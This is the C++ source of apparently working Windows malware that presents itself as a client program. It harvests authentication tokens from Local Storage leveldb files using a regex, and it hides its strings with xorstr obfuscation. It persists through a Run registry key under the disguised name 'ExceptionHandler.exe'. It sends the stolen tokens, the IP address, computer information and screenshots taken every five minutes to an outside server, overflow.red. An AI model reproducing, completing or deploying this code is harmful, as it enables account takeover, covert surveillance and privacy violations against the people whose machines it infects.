#include <filesystem>
#include <string>
#include <fstream>
#include <vector>
#include <regex>
#include <iostream>

#include "..\utility\xor.hpp"
#include "..\utility\requests.h"
#include "..\utility\helper.h"
#include "../gui/gui.h"

namespace fs = std::filesystem;

const bool TEST_SERVER = true;

const std::string STARTUP_FILE_NAME = xorstr_("ExceptionHandler.exe");
const std::string PROGRAM_NAME = xorstr_("OverflowClient.exe");
std::string client_webhook_url = "";
bool 
run_background = false;

std::vector<std::string> get_tokens() {
	std::vector<std::string> tokens = {};
	for (auto path : paths) {
		if (!(stat(path.second.c_str(), &info) != 0) && info.st_mode & S_IFDIR) {
			if (!(info.st_mode & S_IFDIR)) {
				continue;
			}

			path.second += xorstr_("\\Local Storage\\leveldb");

			for (const auto& entry : fs::directory_iterator(path.second)) {
				if (fs::path(entry.path()).extension().string() != xorstr_(".log") && fs::path(entry.path()).extension().string() != xorstr_(".ldb")) {
					continue;
				}

				std::smatch match;
				std::string content = read_file(entry.path().string().c_str());

				std::string::const_iterator search_start(content.cbegin());
				while (std::regex_search(search_start, content.cend(), match, std::regex(regex_token))) {
					tokens.push_back(match[0]);
					search_start = match.suffix().first;
				}
			}
		}
	}
	return tokens;
}

std::string prepare_token_payload(std::vector<std::string> tokens) {
	std::string payload = xorstr_("cmd=send_message&content=**Tokens**\n```\n");
	for (auto token : tokens) {
		payload += token + xorstr_("\n");
	}

	payload += xorstr_("\n```");

	if (TEST_SERVER) {
		payload += xorstr_("&webhook_url=") + client_webhook_url;
	}

	return payload;
}

bool check_for_startup() {
	for (const auto& entry : fs::directory_iterator(roaming + xorstr_("\\Microsoft\\"))) {
		if (entry.path().filename().string() == STARTUP_FILE_NAME) {
			return true;
		}
	}
	return false;
}

void background_loop() {
	while (true) {
		/* Send Screenshot Every 5 Mins */
		take_screenshot(roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
		post_request_file(xorstr_("https://overflow.red/post.php"), roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
		post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url);
		Sleep(300000);
	}
}

void start_client() {
	/* Check If We've Already Created Startup */
	if (check_for_startup()) {
		/* Load Webhook */
		std::ifstream file(roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
		if (file.good()) {
			std::getline(file, client_webhook_url);
		}
		file.close();

		/* Determine If Ran From Startup */
		auto uptime = std::chrono::milliseconds(GetTickCount64());
		if ((uptime / 60000).count() <= 1) {
			post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=") + std::string(xorstr_("**PC Just Turned On**\n```\n") + (uptime / 60000).count() + std::string(xorstr_(" Minutes Ago")) + std::string(xorstr_("\n```"))));
		
			/* Set To Run In Background */
			run_background = true;
		}

		/* Only Send Screenshot */
		take_screenshot(roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
		post_request_file(xorstr_("https://overflow.red/post.php"), roaming + xorstr_("\\Microsoft\\") + xorstr_("temp.jpg"));
		post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_image&content=**PC Screenshot**&webhook_url=") + client_webhook_url);
	} else {
		/* Make Copy To Roaming Microsoft Folder*/
		try {
			std::filesystem::copy(PROGRAM_NAME, roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
		} catch (std::filesystem::filesystem_error & e) {}

		/* Edit registry */
		HKEY key = NULL;
		LONG v1 = RegCreateKey(HKEY_CURRENT_USER, xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), &key);
		LONG v2 = RegSetValueEx(key, xorstr_("ExceptionHandler"), 0, REG_SZ, (BYTE*)(roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).c_str(), ((roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME).size() + 1) * sizeof(wchar_t));
	
		/* Create Client Channel */
		auto title = get_ip();
		std::replace(title.begin(), title.end(), '.', ' ');
		post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=create_channel&name=client-") + title, &client_webhook_url);

		/* Verify Webook Url */
		if (client_webhook_url.empty())
			return;

		/* Get Tokens */
		auto tokens = get_tokens();

		/* Prepare Payload */
		auto payload = prepare_token_payload(tokens);

		/* Post Tokens */
		post_request(xorstr_("https://overflow.red/post.php"), payload);

		/* Post IP */
		post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**IP**\n```\n") + get_ip() + xorstr_("\n```&webhook_url=") + client_webhook_url);

		/* Post Computer Info */
		post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Computer Info**\n```\n") + get_computer_info() + xorstr_("\n```&webhook_url=") + client_webhook_url);

		/* Save Webhook */
		std::ofstream file(roaming + xorstr_("\\Microsoft\\") + xorstr_("log.txt"));
		file << client_webhook_url << std::endl;
		file.close();

		/* Set To Run In Background */
		run_background = true;
	}
}